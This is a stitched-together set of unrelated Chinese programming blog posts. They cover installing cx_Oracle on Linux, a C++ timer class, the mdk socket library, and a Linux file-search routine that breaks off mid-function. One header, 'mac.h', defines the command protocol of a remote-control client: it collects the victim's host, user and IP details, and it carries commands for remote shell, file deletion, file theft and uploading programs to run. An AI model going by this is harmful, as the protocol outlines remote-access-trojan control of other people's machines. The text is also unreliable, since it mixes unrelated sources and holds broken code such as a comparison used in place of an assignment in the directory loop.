当然，如果oracle安装在linux 主机上，或者需要使用通用的服务器性能。所以还是需要姜python等插件部署在linux服务器上面，下面就分享一下红帽主机下使用python的插件cx_Oracle(注意大写)入库。
2.1 Linux下多个版本的python共存
Linux下默认系统自带python2.6的版本，这个版本被系统很多程序所依赖，所以不建议删除，如果使用最新的Python3那么我们知道编译安装源码包和系统默认包之间是没有任何影响的，所以可以安装python3和python2共存 
2.1.1 使用版本管理工具pyenv
经常遇到这样的情况： 
•   系统自带的Python是2.6，自己需要Python 2.7中的某些特性； 
•   系统自带的Python是2.x，自己需要Python 3.x； 
此时需要在系统中安装多个Python，但又不能影响系统自带的Python，即需要实现Python的多版本共存。pyenv就是这样一个Python版本管理器。可以下载安装。
2.2.2 安装时进行配置
如果你想用python3，你可以下载python源码，在配置的时候指定perfix，比如你可以安装到/usr/local/python3, （主要步骤）

./configure –prefix=/usr/local/python3

之后配置正确就可以使用/usr/local/python3/bin/python3启动python3.
一般安装步骤 
RedHat下安装Python3步骤
1.下载解压。

$ tar zxvf Python-3.5.2.tgz

2.进入解压后的目录，执行安装配置

$ ./configure –prefix=/opt/python3

3.Build

$ make

4.Install

$ make install

5.建立软连接 
安装后建立一个链接，这样我们可以用python3直接运行程序，和python2区别开来。

$ ln -s /opt/python3/bin/python3 /usr/bin/python3

之后直接在命令行输入python3就可以直接启动啦。

2.2 linux 下 cx_Oracle安装
安装Python的cx_Oracle，接下来说说如何安装它。
一、涉及软件包
1、cx_Oracle
下载地址：http://sourceforge.net/projects/cx-oracle/files/?source=navbar 
我下载的是最新版的cx_Oracle-5.2.1.tar.gz
2、Oracle_client
使用cx_Oracle必须要安装Oracle_client端，或者你已经安装了Oracle数据库。 
下载地址：http://www.oracle.com/technetwork/topics/linuxx86-64soft-092277.html
以连接Oracle11(其实12也行，这和oracle client版本无关)为例需要下载以下rpm包：

oracle-instantclient11.2-basic-11.2.0.4.0-1.x86_64.rpm 
  oracle-instantclient11.2-jdbc-11.2.0.4.0-1.x86_64.rpm 
  oracle-instantclient11.2-sqlplus-11.2.0.4.0-1.x86_64.rpm 
  oracle-instantclient11.2-devel-11.2.0.4.0-1.x86_64.rpm 
  oracle-instantclient11.2-odbc-11.2.0.4.0-1.x86_64.rpm 
  oracle-instantclient11.2-tools-11.2.0.4.0-1.x86_64.rpm

软件包都下载完后，我们开始来安装。
二、源码安装
1、Oracle_client端安装：

# rpm -ivh oracle-instantclient11.2-basic-11.2.0.4.0-1.x86_64.rpm  oracle-instantclient11.2-jdbc-11.2.0.4.0-1.x86_64.rpm  oracle-instantclient11.2-sqlplus-11.2.0.4.0-1.x86_64.rpm oracle-instantclient11.2-devel-11.2.0.4.0-1.x86_64.rpm  oracle-instantclient11.2-odbc-11.2.0.4.0-1.x86_64.rpm  oracle-instantclient11.2-tools-11.2.0.4.0-1.x86_64.rpm
# echo /usr/lib/oracle/11.2/client64/lib/ >> /etc/ld.so.conf 
  # ldconfig

如果不进行ldconfig配置，在运行cx_Oracle时会报以下错误：

libclntsh.so.11.1: cannot open shared object file: No such file or directory

2、设置相应用户的环境变量： 
在这里需要说明下，你使用哪个帐户装cx_Oracle就需要配置哪个帐户的环境变量，以下已root帐户为例； 
如果不配置环境变量、或环境变量配置不正确，在安装cx_Oracle时，会报各种错误，比如说： 
oci.h: No such file or directory

#vi ~/.bashrc 
  export TNS_ADMIN=”/usr/lib/oracle” 
  export ORACLE_HOME=”/usr/lib/oracle/11.2/client64” 
  export LD_LIBRARY_PATH=”${LD_LIBRARY_PATH}:${ORACLE_HOME}/lib” 
  export PATH=”${PATH}:${ORACLE_HOME}” 
  #source ~/.bashrc

3、源码安装

#tar -zxvf cx_Oracle-5.1.2.tar.gz 
  #cd cx_Oracle-5.1.2 
  #python setup.py install

4、安装成功后相应检查

#python3 
  Python 3.5.2 (default, Aug 21 2013, 12:12:55)  
  [GCC 4.4.4 20100726 (Red Hat 4.4.4-13)] on linux2 
  Type “help”, “copyright”, “credits” or “license” for more information. 
  >>>import cx_Oracle 
  >>>

到这没啥问题就ok了。
相关阅读： 
CentOS install Python 2.6.5 & cx_Oracle  http://www.linuxidc.com/Linux/2011-04/34193.htm 
Python中cx_Oracle模块安装遇到的问题与解决方法 http://www.linuxidc.com/Linux/2011-04/34118.htm 
Python+cx_Oracle安装及一个简单示例(归档下热备数据文件) http://www.linuxidc.com/Linux/2010-10/29187.htm 
《Python开发技术详解》.( 周伟,宗杰).[高清PDF扫描版+随书视频+代码] http://www.linuxidc.com/Linux/2013-11/92693.htm 
Python脚本获取Linux系统信息 http://www.linuxidc.com/Linux/2013-08/88531.htm 
Python 的详细介绍：请点这里 
Python 的下载地址：请点这里 
更多Oracle相关信息见Oracle 专题页面 http://www.linuxidc.com/topicnews.aspx?tid=12
3. cx_Oracle使用简介
使用流程： 
1.导入模块cx_Oracle 
2.连接数据库 
3.获取cursor 
4.使用cursor进行各种操作 
5.关闭cursor 
6.关闭连接
实例代码
import sys
import cx_Oracle

connection = cx_Oracle.Connection("user/pw@tns")
cursor = connection.cursor()

try:
    cursor.execute("select 1 / 0 from dual")
except cx_Oracle.DatabaseError, exc:
    error, = exc.args
    print >> sys.stderr, "Oracle-Error-Code:", error.code
一次多行
大型的插入操作不需求多次的单独插入，这是因为 Python 通过 cx_Oracle.Cursor.executemany 方法完全支持一次插入多行。限制执行操作的数量极大地改善了程序性能，因此在编写存在大量插入操作的应用程序时应首先考虑这一功能。
我们首先为 Python 模块列表创建一个表，这次直接从 Python 开始。您将在以后删除该表。

create_table = “”” 
  CREATE TABLE python_modules ( 
  module_name VARCHAR2(50) NOT NULL, 
  file_path VARCHAR2(300) NOT NULL 
  ) 
  “”” 
  from sys import modules 
  cursor.execute(create_table) 
   M = [] 
   for m_name, m_info in modules.items(): 
  try: 
  M.append((m_name, m_info.__file__)) 
  except AttributeError: 
  pass

cursor.prepare(“INSERT INTO python_modules(module_name, file_path) VALUES (:1, :2)”) 
cursor.executemany(None, M) 
db.commit() 
r = cursor.execute(“SELECT COUNT(*) FROM python_modules”) 
 print cursor.fetchone()
cursor.execute(“DROP TABLE python_modules PURGE”) 
仅向数据库发出一个执行操作，要求将 76 个模块名称全部插入。这对大型插入操作而言是一个巨大的性能提升。注意此处的两点小的不同：cursor.execute(create_tab) 不产生任何输出，这是因为它是一个 DDL 语句，而 (76,) 是一个有单个元素的字节组。不含逗号的 (76) 完全等同于整数 76。
(未完待续。。。。)
参考文档
http://cx-oracle.readthedocs.io/en/latest/
精通oracle+python系列：(官方文档强烈推荐) 
http://www.oracle.com/technetwork/cn/articles/dsl/mastering-oracle-python-1391323-zhs.html
其他还未看： 
https://my.oschina.net/bxxfighting/blog/386578 
http://www.cnblogs.com/hzhida/archive/2012/08/13/2636735.html 
http://blog.itpub.net/22664653/viewspace-711879/ 
http://www.cnblogs.com/heric/p/5804434.html 
http://www.cnblogs.com/linn/p/4229083.html 
调用存储过程 
http://blog.csdn.net/my2010sam/article/details/20724001 








#pragma once
/*
//计算代码段运行时间的类
//
*/
#include <iostream>

#ifndef ComputeTime_h
#define ComputeTime_h


class   ComputeTime    
{  
private:  
	int Initialized;  
	__int64 Frequency;  
	__int64 BeginTime;  
		    
public:  

	bool Avaliable();  
	double End();  
	bool Begin();  
	ComputeTime();  
	virtual   ~ComputeTime();    

};  


#endif




#include "stdafx.h"
#include "ComputeTime.h"
#include <iostream>
#include <Windows.h>

ComputeTime::ComputeTime()  
{  
	Initialized=QueryPerformanceFrequency((LARGE_INTEGER   *)&Frequency);  
}  
   
 ComputeTime::~ComputeTime()  
{  
		    
}  
   
 bool   ComputeTime::Begin()  
{  
	if(!Initialized)  
		return 0;

	 return   QueryPerformanceCounter((LARGE_INTEGER   *)&BeginTime);  
 }
     
 double   ComputeTime::End()
{  
	 if(!Initialized)  
		return 0;

		   
	 __int64   endtime;  
		   
	 QueryPerformanceCounter((LARGE_INTEGER   *)&endtime);  
		    
		  
	 __int64   elapsed = endtime-BeginTime;  
		    
		  
	 return   ((double)elapsed/(double)Frequency)*1000.0;  //单位毫秒
 }  

 bool   ComputeTime::Avaliable()
{  
	 return Initialized;  
}   

 





首先，我们可以用到这个开源的开发包：
mdk(Micro-Development-Kit)微量级软件开发包，提供几个常用类，主要实现了一个高性能的并发服务器引擎 
  使用c++开发，是一个跨平台的开发包，支持linux32/linux64/win32/win64的类库  。
  mdk服务器引擎，提出面向业务的服务器开发模式，根据服务器业务层最关心的3件事，抽象出连接发生（OnConnect），消息到达（OnClose），连接关闭（OnClose）3个接口，让服务器端开发者可以全身心的投入业务逻辑的开发中。 
特点：        提供分布式支持，自身是一个server-client的结合体（即做服务器使用的同时，也可以像client一样去连接别的服务器，组成分布式系统），并且io接口统一到onconnect onmsg onclose中，不必区别对待        事件轮巡使用的是原生epoll iocp实现，确保了对io响应速度的完全掌控        几乎等同于lock free的并发算法，保证并发效率       
 欢迎大家共同学习使用。
 
http://download.csdn.net/detail/wangyaninglm/8260299
或者是这里：
https://github.com/huoyu820125/Micro-Development-Kit
 
 
 我们写客户端的时候可以用到里面 的socket类
socket.h如下：
// Socket.h: interface for the Socket class.
//
//////////////////////////////////////////////////////////////////////
/***********************************************************************

************************************************************************/

#ifndef MDK_SOCKET_H
#define MDK_SOCKET_H

#include <iostream>

using namespace std;

#ifdef WIN32
#include <windows.h>



#define socklen_t int
#else
#include <errno.h>

#include <string.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>

#define INVALID_SOCKET -1
#define SOCKET_ERROR -1
#define closesocket close
typedef int SOCKET;
#endif


#include <time.h>
#include <assert.h>
#include <string>

namespace mdk
{

class Socket
{
public:
	enum SocketError
	{
		seTimeOut = -2,
		seSocketClose = -1,
		seError = -3,
	};
	enum protocol 
	{
		tcp = SOCK_STREAM,
		udp = SOCK_DGRAM,
	};

	Socket();
	Socket( SOCKET hSocket, protocol nProtocolType );
	virtual ~Socket();
	
public:
	//
	SOCKET GetSocket();
	/*
		
	*/
	bool Init(protocol nProtocolType);
	/**
		
	 */
	void Close();
	//
	bool IsClosed();

	//////////////////////////////////////////////////////////////////////////
	/*
    TCP
		
	*/
	int Send( const void* lpBuf, int nBufLen, int nFlags = 0 );
	/*
		
	*/
	int Receive( void* lpBuf, int nBufLen, bool bCheckDataLength = false, long lSecond = 0, long lMinSecond = 0 );

	//////////////////////////////////////////////////////////////////////////
	/*UDP
	
	*/
	int SendTo( const char *strIP, int nPort, const void* lpBuf, int nBufLen, int nFlags = 0 );
	/*
		
	*/
	int ReceiveFrom( char* lpBuf, int nBufLen, std::string &strFromIP, int &nFromPort, bool bCheckDataLength = false, long lSecond = 0, long lMinSecond = 0 );

	/*
		
	*/
	bool Connect( const char* lpszHostAddress, unsigned short nHostPort );

	/*
		
	*/
	bool StartServer( int nPort );
	/*
	*/
	bool Accept(Socket& rConnectedSocket);
	//
	void GetWanAddress( std::string& strWanIP, int& nWanPort );
	//
	void GetLocalAddress( std::string& strWanIP, int& nWanPort );
	/*
		
	*/
	bool SetSockMode( bool bWait = false );
	/*
		
	*/
	bool SetSockOpt( int nOptionName, const void* lpOptionValue, int nOptionLen, int nLevel = SOL_SOCKET );

	/*
	*/
	static bool SocketInit(void *lpVoid = NULL);
	static void SocketDestory();
	//
	void GetLastErrorMsg( std::string &strError );
	
	//
	//
	static bool InitForIOCP( SOCKET hSocket );

	/*
		
	*/
	void Attach( SOCKET hSocket );
	/*
		
	*/
	SOCKET Detach();

	//
	//
	bool InitWanAddress();
	//
	//
	bool InitLocalAddress();
	
protected:
	/*
		
	*/
	bool TimeOut( long lSecond, long lMinSecond );
	//
	bool WaitData();
	/*
		
	*/
	void GetAddress( const sockaddr_in &sockAddr, std::string &strIP, int &nPort );
	/*
		
	*/
	bool Bind( unsigned short nPort, char *strIP = NULL );
	/*
		
	*/
	bool Listen( int nConnectionBacklog = SOMAXCONN );
		
public:
private:
	SOCKET m_hSocket;//
	bool m_bBlock;//
	bool m_bOpened;//
	sockaddr_in m_sockAddr;
	std::string m_strWanIP;
	int m_nWanPort;
	std::string m_strLocalIP;
	int m_nLocalPort;
};

}//namespace mdk

#endif // MDK_SOCKET_H


 
socket.cpp的实现：
// Socket.cpp: implementation of the Socket class.
//
//////////////////////////////////////////////////////////////////////
#include <stdio.h>
#include <iostream>
#include "Socket.h"

#ifdef WIN32
//#include <windows.h>
#pragma comment ( lib, "ws2_32.lib" )
#endif

using namespace std;
namespace mdk
{

Socket::Socket()
{
	m_hSocket = INVALID_SOCKET;
	m_bBlock = true;
	m_bOpened = false;//
}

Socket::Socket( SOCKET hSocket, protocol nProtocolType )
{
	m_hSocket = hSocket;
	m_bBlock = true;
	m_bOpened = false;//
	Init(nProtocolType);
	InitWanAddress();
	InitLocalAddress();
}

Socket::~Socket()
{

}

/*

*/
bool Socket::SocketInit(void *lpVoid)
{
#ifdef WIN32
	// initialize Winsock library
	WSADATA *lpwsaData = (WSADATA *)lpVoid;
	WSADATA wsaData;
	if (lpwsaData == NULL)
		lpwsaData = &wsaData;

	WORD wVersionRequested = MAKEWORD(1, 1);
	__int32 nResult = WSAStartup(wVersionRequested, lpwsaData);
	if (nResult != 0)
		return false;

	if (LOBYTE(lpwsaData->wVersion) != 1 || HIBYTE(lpwsaData->wVersion) != 1)
	{
		WSACleanup();
		return false;
	}
#endif
	return true;
}

void Socket::SocketDestory()
{
#ifdef WIN32
	WSACleanup();
#endif
}


void Socket::GetLastErrorMsg( string &strError )
{
	char strErr[1024];
#ifdef WIN32
	LPSTR lpBuffer;
	DWORD dwErrorCode = WSAGetLastError();

	FormatMessage( FORMAT_MESSAGE_ALLOCATE_BUFFER
		| FORMAT_MESSAGE_FROM_SYSTEM,
		NULL,
		dwErrorCode,
		LANG_NEUTRAL,
		(LPTSTR)&lpBuffer,
		0,
		NULL );
	sprintf( strErr, "Socket Error(%ld):%s", dwErrorCode, lpBuffer );
	strError = strErr;
	LocalFree(lpBuffer);

#else
	sprintf( strErr, "socket errno(%d):%s\n", errno, strerror(errno) );
	strError = strErr;
#endif
}


bool Socket::InitForIOCP( SOCKET hSocket )
{
#ifdef WIN32
	return 0 == setsockopt( hSocket,
		SOL_SOCKET, SO_UPDATE_ACCEPT_CONTEXT,
		(char *)&(hSocket), sizeof(hSocket) );
#else
	return true;
#endif
}


//
SOCKET Socket::GetSocket()
{
	return m_hSocket;
}


void Socket::GetWanAddress( string& strWanIP, int& nWanPort )
{
	nWanPort = m_nWanPort;
	strWanIP = m_strWanIP;
	return;
}



bool Socket::InitWanAddress()
{
	assert( INVALID_SOCKET != m_hSocket );

	sockaddr_in sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	socklen_t nSockAddrLen = sizeof(sockAddr);
	if ( SOCKET_ERROR == getpeername( m_hSocket,
		(sockaddr*)&sockAddr, &nSockAddrLen ) ) return false;
	m_nWanPort = ntohs(sockAddr.sin_port);
	m_strWanIP = inet_ntoa(sockAddr.sin_addr);

	return true;
}


void Socket::GetLocalAddress( string& strWanIP, int& nWanPort )
{
	nWanPort = m_nLocalPort;
	strWanIP = m_strLocalIP;
	return;
}

bool Socket::InitLocalAddress()
{
	sockaddr_in sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	socklen_t nSockAddrLen = sizeof(sockAddr);
	if ( SOCKET_ERROR == getsockname( m_hSocket,
		(sockaddr*)&sockAddr, &nSockAddrLen )) return false;
	m_nLocalPort = ntohs(sockAddr.sin_port);
	m_strLocalIP = inet_ntoa(sockAddr.sin_addr);

	return true;
}

/*

*/
bool Socket::Init(protocol nProtocolType)
{
	if ( m_bOpened ) return true;
	if ( m_hSocket == INVALID_SOCKET )
	{
		m_hSocket = socket( PF_INET, nProtocolType, 0 );
		if ( m_hSocket == INVALID_SOCKET ) return false;
	}
	m_bOpened = true;

	return m_bOpened;
}

/*

*/
bool Socket::Connect( const char *lpszHostAddress, unsigned short nHostPort)
{
	assert( NULL != lpszHostAddress );

	sockaddr_in sockAddr;
	memset(&sockAddr,0,sizeof(sockAddr));
	sockAddr.sin_family = AF_INET;
	sockAddr.sin_addr.s_addr = inet_addr(lpszHostAddress);
	sockAddr.sin_port = htons( nHostPort );

	if ( SOCKET_ERROR != connect(m_hSocket, (sockaddr*)&sockAddr, sizeof(sockAddr)) )
	{
		InitWanAddress();
		InitLocalAddress();
		return true;
	}

	return false;
}

//
bool Socket::StartServer( int nPort )
{
	if ( !this->Bind( nPort ) ) return false;
	return this->Listen();
}

//
bool Socket::IsClosed()
{
	return !m_bOpened;
}
/*

*/
void Socket::Close()
{
	if ( INVALID_SOCKET == m_hSocket ) return;
	if ( m_bOpened )
	{
		closesocket(m_hSocket);
		m_bOpened = false;
	}
	m_hSocket = INVALID_SOCKET;
	return;
}

/*

*/
void Socket::Attach(SOCKET hSocket)
{
	m_hSocket = hSocket;
	m_bBlock = true;
	m_bOpened = true;//
	InitWanAddress();
	InitLocalAddress();
}

/*

*/
SOCKET Socket::Detach()
{
	SOCKET hSocket = m_hSocket;
	m_hSocket = INVALID_SOCKET;
	m_bBlock = true;
	m_bOpened = false;//
	return hSocket;
}

/*

*/
int Socket::Receive( void* lpBuf, int nBufLen, bool bCheckDataLength, long lSecond, long lMinSecond )
{
	if ( TimeOut( lSecond, lMinSecond ) ) return seTimeOut;//³¬Ê±
	int nResult;
	int nFlag = 0;
	if ( bCheckDataLength ) nFlag = MSG_PEEK;
	nResult = recv(m_hSocket, (char*)lpBuf, nBufLen, nFlag);
	if ( 0 == nResult ) return seSocketClose;//
	if ( SOCKET_ERROR != nResult ) return nResult;//ú

	//socket
#ifdef WIN32
		int nError = GetLastError();
		if ( WSAEWOULDBLOCK == nError ) return 0;//
		return seError;
#else
		if ( EAGAIN == errno ) return 0;//
		return seError;
#endif
}

/*

*/
int Socket::Send( const void* lpBuf, int nBufLen, int nFlags )
{
	int nSendSize = send(m_hSocket, (char*)lpBuf, nBufLen, nFlags);
	if ( 0 > nSendSize )
	{
#ifdef WIN32
		int nError = GetLastError();
		return -1;
#else
		return -1;
#endif
	}
	if ( nSendSize <= nBufLen ) return nSendSize;
	return -1;
}

/*

*/
bool Socket::Bind( unsigned short nPort, char *strIP )
{
	memset(&m_sockAddr,0,sizeof(m_sockAddr));
	m_sockAddr.sin_family = AF_INET;
	if ( NULL == strIP ) m_sockAddr.sin_addr.s_addr = htonl(INADDR_ANY);
	else
	{
		unsigned long lResult = inet_addr( strIP );
		if ( lResult == INADDR_NONE ) return false;
		m_sockAddr.sin_addr.s_addr = lResult;
	}
	m_sockAddr.sin_port = htons((unsigned short)nPort);

	return (SOCKET_ERROR != bind(m_hSocket, (sockaddr*)&m_sockAddr, sizeof(m_sockAddr)));
}

/*

*/
bool Socket::Listen( int nConnectionBacklog )
{
	return (SOCKET_ERROR != listen(m_hSocket, nConnectionBacklog));
}

/*

*/
bool Socket::Accept(Socket& rConnectedSocket)
{
	assert( INVALID_SOCKET == rConnectedSocket.m_hSocket );
	socklen_t sockAddLen = 0;
	rConnectedSocket.m_hSocket = accept(m_hSocket, NULL, &sockAddLen);
	if ( INVALID_SOCKET == rConnectedSocket.m_hSocket )
	{
#ifdef WIN32
		if ( WSAEWOULDBLOCK == GetLastError() ) return true;//
#else
		if ( EAGAIN == errno ) return true;//
#endif
		return false;//socket
	}
	rConnectedSocket.m_bOpened = true;
	rConnectedSocket.InitWanAddress();
	rConnectedSocket.InitLocalAddress();
	return true;
}

/*

*/
bool Socket::SetSockOpt(
						   int nOptionName,
						   const void* lpOptionValue,
						   int nOptionLen,
						   int nLevel)
{
	return ( SOCKET_ERROR != setsockopt(
		m_hSocket,
		nLevel,
		nOptionName,
		(char *)lpOptionValue,
		nOptionLen));
}

/*

*/
bool Socket::TimeOut( long lSecond, long lMinSecond )
{
	if ( lSecond <= 0 && lMinSecond <= 0 ) return false;
	//
	timeval outtime;//
	outtime.tv_sec = lSecond;
	outtime.tv_usec =lMinSecond;
	int nSelectRet;
#ifdef WIN32
	FD_SET readfds = { 1, m_hSocket };
	nSelectRet=::select( 0, &readfds, NULL, NULL, &outtime ); //
#else
	fd_set readfds;
	FD_ZERO(&readfds);
	FD_SET(m_hSocket, &readfds);
	nSelectRet=::select(m_hSocket+1, &readfds, NULL, NULL, &outtime); //
#endif

	if ( SOCKET_ERROR == nSelectRet )
	{
		return true;
	}
	if ( 0 == nSelectRet ) //
	{
		return true;
	}

	return false;
}

//
bool Socket::WaitData()
{
	int nSelectRet;
#ifdef WIN32
	FD_SET readfds = { 1, m_hSocket };
	nSelectRet=::select( 0, &readfds, NULL, NULL, NULL ); //
#else
	fd_set readfds;
	FD_ZERO(&readfds);
	FD_SET(m_hSocket, &readfds);
	nSelectRet=::select(m_hSocket+1, &readfds, NULL, NULL, NULL); //
#endif
	if ( SOCKET_ERROR == nSelectRet )
	{
		return false;
	}
	if ( 0 == nSelectRet ) //
	{
		return false;
	}
	return true;
}

/*

*/
bool Socket::SetSockMode( bool bWait )
{
#ifdef WIN32
	m_bBlock = bWait;
	unsigned long ul = 1;
	if ( m_bBlock ) ul = 0;
	else ul = 1;
	int ret = ioctlsocket( m_hSocket, FIONBIO, (unsigned long*)&ul );
	if ( ret == SOCKET_ERROR )
	{
		return false;
	}
#else
	m_bBlock = bWait;
	int flags = fcntl( m_hSocket, F_GETFL, 0 ); //
	if ( !m_bBlock )
		fcntl( m_hSocket, F_SETFL, flags|O_NONBLOCK );//
	else
		fcntl( m_hSocket, F_SETFL, flags&(~O_NONBLOCK&0xffffffff) );//
#endif
	return true;
}

/*

*/
int Socket::SendTo( const char *strIP, int nPort, const void* lpBuf, int nBufLen, int nFlags )
{
	sockaddr_in sockAddr;
	memset(&sockAddr,0,sizeof(sockAddr));
	sockAddr.sin_family = AF_INET;
	sockAddr.sin_port = htons(nPort);
	sockAddr.sin_addr.s_addr = inet_addr(strIP);

	int ret = sendto( m_hSocket, (const char*)lpBuf, nBufLen, nFlags,
		(sockaddr*)&sockAddr, sizeof(sockaddr));
	if (ret < 0) ret = -1;
	return ret;
}

/*
*/
int Socket::ReceiveFrom( char* lpBuf, int nBufLen, string &strFromIP, int &nFromPort, bool bCheckDataLength, long lSecond, long lMinSecond )
{
	strFromIP = "";
	nFromPort = -1;
	if ( 0 >= nBufLen ) return 0;
	sockaddr_in sockAddr;
	socklen_t nAddrLen = sizeof(sockaddr);
	/* waiting for receive data */
	int nResult;
	int nFlag = 0;
	while ( true )
	{
		if ( TimeOut( lSecond, lMinSecond ) ) return seTimeOut;
		if ( bCheckDataLength )nFlag = MSG_PEEK;
		nResult = recvfrom(m_hSocket, lpBuf, nBufLen, nFlag, (sockaddr*)&sockAddr, &nAddrLen);
		if ( nAddrLen > 0 ) GetAddress(sockAddr, strFromIP, nFromPort);
		if ( SOCKET_ERROR == nResult ) //
		{
#ifndef WIN32
			if ( EAGAIN == errno ) return 0;//
			return seError;
#else
			int nError = GetLastError();
			if ( 0 == nError )//
			{
				if ( MSG_PEEK == nFlag )//
				{
					recvfrom(m_hSocket, lpBuf, nBufLen, 0, (sockaddr*)&sockAddr, &nAddrLen);
				}
				continue;
			}
			if ( WSAEWOULDBLOCK == nError ) return 0;//
			return seError;
#endif
		}
		break;
	}
	return nResult;
}

void Socket::GetAddress( const sockaddr_in &sockAddr, string &strIP, int &nPort )
{
	nPort = ntohs(sockAddr.sin_port);
	strIP = inet_ntoa(sockAddr.sin_addr);
}

}//namespace mdk


 
 定义一个客户端的经常用的头文件：
 
//
//  mac.h
//  mac_client
//
//  Created by mac mac on 13-5-8.
//  Copyright (c) 2013年 __MyCompanyName__. All rights reserved.
//

#ifndef mac_client_mac_h
#define mac_client_mac_h
////////////////////////////////////////////////////////////////////////////////////////
/*
1.注意中文标点，编译器不容易察觉
2.server 和client端的宏定义大小要统一
*/
/////////////////////////////////////////////////////////////////////////////////////////
#define MAX_SIZE 1024
#define MAX_NAME_LENGTH 64
#define MAX_PATH 260            //保持和windows端定义的一样
#define MAX_PATH_MAC 256       //苹果的最大长度
#define FALSE 0
#define TRUE 1

#define MAX_SEND_BUFFER 1024*4
#define MAX_RECV_BUFFER 1024*4

/////////////////////////////////////////////////////////////////////////////////////////



typedef struct Command //自定义命令结构体
{
    int order;//命令序号
    long datasize;
    void * hwnd;//窗口句柄
    
}Command;
 

typedef struct Server_Address //服务器地址
{
    
    char strIP[3][MAX_PATH];//服务器ip
    unsigned int uPort[3] ; //服务器端口
    char remark[MAX_NAME_LENGTH];
}Server_Address;


typedef struct _SYS_INFO //到时候得增加备注
{
    Command         cmd;
    char            remark[MAX_NAME_LENGTH];            //备注
    char            computer_name[MAX_NAME_LENGTH];     //
    char            user_name[MAX_NAME_LENGTH];         //
    char            sys_version[MAX_NAME_LENGTH];       //
    char            cpu_type[MAX_NAME_LENGTH];          //
    char            host_ip_address[MAX_NAME_LENGTH];   //内网ip
    char            ip_addresss[MAX_NAME_LENGTH];       //外网ip
    char            uuid[MAX_NAME_LENGTH];             //被控端的唯一标识
    
    unsigned int    cpu_num;                            //
    unsigned int    mem_total;                          //
    int             host_id;                            //
}SYS_INFO;




enum 
{
    COMMAND_BIGIN = 20000,     //命令开始
    TOKEN_ONLINE,              //上线命令
    COMMAND_BREAK,             //断开链接
    COMMAND_UNINSTALL,         //卸载　
    COMMAND_MODIFY_REMARK,     //修改备注
///////////////////////////////////////////////////////////////////////////
    COMMAND_MANAGER_FILE,           //打开文件管理窗口
    COMMAND_GET_DIRECTORY,          //获取控制端主机根目录下所有文件信息 
    COMMAND_GET_REQUEST_DIRECTORY,  //获取双击请求目录中所有文件信息
    COMMAND_SEARCH_FILE,            //文件搜索，还没做
    COMMAND_WRONG_DIRECTORY,        //目录为空或者不可读
    COMMAND_DELETE_FILE,            //删除文件
    COMMAND_FILE_CLOSE,             //关闭当前文件管理功能的链接
//////////////////////////////////////////////////////////////////////////
    
    COMMAND_MANAGER_CMD,    //打开cmd管理窗口
    TOKEN_CMD_NEXT,         //等待下一个命令
    COMMAND_SHELL,          //控制端请求的shell命令
    COMMAND_SHELL_CLOSE,    //关闭shell
////////////////////////////////////////////////////////////////////////// 
    COMMAND_MANAGER_DOWNLOAD,   //打开文件下载功能
    TOKEN_DOWNLOAD_SETUP,   //控制端发送文件下载连接和uuid
    COMMAND_GET_FILEDATA,   //请求文件数据
    TOKEN_SENT_FILEDATA,    //发送文件数据
    TOKEN_CANT_GET_DATA,    //给控制端发送消息文件不可读
////////////////////////////////////////////////////////////////////////
    COMMAND_MANAGER_UPLOAD,     //开启文件上传
    TOKEN_UPLOAD_SETUP,         //接受文件上传连接
    COMMAND_SENT_UPLOAD_DATA,   //发送上传文件数据
    TOKEN_UPLOAD_DATA,          //请求上传文件数据
    TOKEN_UPLOAD_COMPLETE,      //文件上传完成
    COMMAND_RUN_PROGARM,        //上传运行的文件
    
    COMMAND_UPLOAD_CLOSE,      //关闭上传进程和连接
    
    
 };



#endif


 
客户端centos下面使用正常，开发环境codeblocks
 客户端下载：
http://download.csdn.net/detail/wangyaninglm/8326249
 
服务器windows 7，xp都没有问题，开发环境visual studio 2010
服务端下载：
http://download.csdn.net/detail/wangyaninglm/8326321
 
 整体界面：

命令行效果：

文件管理效果：

 
未完待续
。
。
。






跨平台的网络通信，跟设备的集成控制，牵扯到在各种平台下的文件搜索问题，windows下面的已经有了。
地址如下：
http://blog.csdn.net/wangyaninglm/article/details/8668132
 
这篇文章主要介绍一下linux下面的文件搜索实现：
Filesearch.h
//
//  Filesearch.h
//  //
//  Created by mac mac on 13-4-28.
//  Copyright (c) 2013年 __MyCompanyName__. All rights reserved.
//

#ifndef _Filesearch_h
#define _Filesearch_h

//#include <stdio.h>
//#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <pwd.h>
#include <unistd.h>
//#include <string.h>
#include <time.h>
#include "mac.h"
#include "Socket.h"


//#define MAX_PATH 255



int IsDir(char *name);

void Search_File(char *path,char *name);

//int search_flag = 0;

/*
 int main(int argc , char *argv[])
{
    static char *current_dir;
    static char *file_name;
    int length;
    
    if(argc==1)
    {
        printf("it takes more parameter!!!n");
        
    }
    
    if(argc==2)
    {
        current_dir = (char *)getcwd(current_dir,MAX_PATH);
    }
    
    if(argc==3)
    {
        length = strlen(argv[1]);
        
        if(length>1 && (argv[1][length-1]=='/'))
        {
            argv[1][length-1]=='�';
            
        }
        current_dir = argv[1];
        file_name = argv[2];
    }
    
    Search_File(current_dir,file_name);
    
    printf("Hello world!n");
    return 0;
}
 
 
 
 */


#endif


Filesearch.cpp:
//
//  Filesearch.cpp
//  mac_client
//
//  Created by mac mac on 13-5-21.
//  Copyright (c) 2013年 __MyCompanyName__. All rights reserved.
//
#include <stdio.h>
#include <iostream>
#include "Filesearch.h"

int search_flag = 0;

int IsDir(char *name)
{
    struct stat buff;

    if(lstat(name,&buff)<0)
        return 0;

    return S_ISDIR(buff.st_mode);

}

//调用的时候直接使用'/'目录作为搜索路径，相当于搜索全盘了。

void Search_File(char *path,char *name)
{
    DIR *directory;
    struct dirent *dir_entry;
    char buffer[MAX_PATH];

    if((directory = opendir(path)) == NULL)
    {
        fprintf(stderr,"%s",path);
        printf(path);
        perror(" ");
        return;
    }

    while(dir_entry == readdir(directory))
    {
        if(!strcmp(dir_entry->d_name,".")||!strcmp(dir_entry->d_name,".."))
        {
            //do nothing
        }
        else
        {
            if((strcmp(path,"/")) == 0)
            {
                sprintf(buffer,"%s%s",path,dir_entry->d_name);
                // printf(buffer);
                /*  if is not  boot  directory do not add "/"*/

            }
            else
            {
                sprintf(buffer,"%s/%s",path,dir_entry->d_name);
                printf(buffer);
                printf("\n");
